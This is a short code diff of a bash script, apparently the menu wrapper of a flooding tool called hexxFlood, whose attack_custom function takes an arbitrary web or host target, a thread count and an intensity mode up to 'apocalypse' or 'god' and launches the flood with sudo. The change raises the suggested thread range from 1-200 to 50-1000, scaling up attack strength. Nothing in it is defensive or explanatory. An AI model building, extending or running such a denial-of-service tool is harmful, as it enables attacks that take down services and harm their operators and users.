@@ -147,7 +147,7 @@ attack_custom() {
     
     if [[ "$target" == http* ]] || [[ "$target" == https* ]]; then
         echo "Web target detected"
-        read -p "Threads (1-200, default: 50): " threads
+        read -p "Threads (default 50, e.g. 50-1000): " threads
         threads=${threads:-50}
         read -p "Mode (low/medium/high/extreme/apocalypse/god, default: high): " mode
         mode=${mode:-high}
@@ -157,7 +157,7 @@ attack_custom() {
         echo -e "${GREEN}Starting custom web attack on $target${NC}"
         sudo hexxFlood -u "$target" -p "$threads" -m "$mode" -D "$duration"
     else
-        read -p "Threads (1-200, default: 50): " threads
+        read -p "Threads (default 50, e.g. 50-1000): " threads
         threads=${threads:-50}
         read -p "Mode (low/medium/high/extreme/apocalypse/god, default: high): " mode
         mode=${mode:-high}
